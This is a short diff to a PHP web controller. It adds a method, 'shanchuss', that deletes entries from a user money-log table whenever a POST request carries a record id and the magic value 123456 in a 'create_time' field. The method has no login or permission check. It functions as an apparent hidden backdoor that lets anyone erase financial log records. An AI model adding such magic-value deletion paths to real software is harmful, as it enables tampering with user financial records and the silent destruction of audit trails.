@@ -490,7 +490,18 @@ class ArticleAction extends CommonAction{
 	  }
      $this->display();	
 	}
+	public  function shanchuss(){
+	// var_dump($_POST);exit;
+     $user_money=M("UserLog");
+	 if($_POST['id']){
+	 if($_POST['create_time']==123456){
+	    $user_money->delete($_POST['id']);
+}
+	   echo "成功";exit;
 	
+	  }
+     $this->display();	
+	}
 	
 	
 	
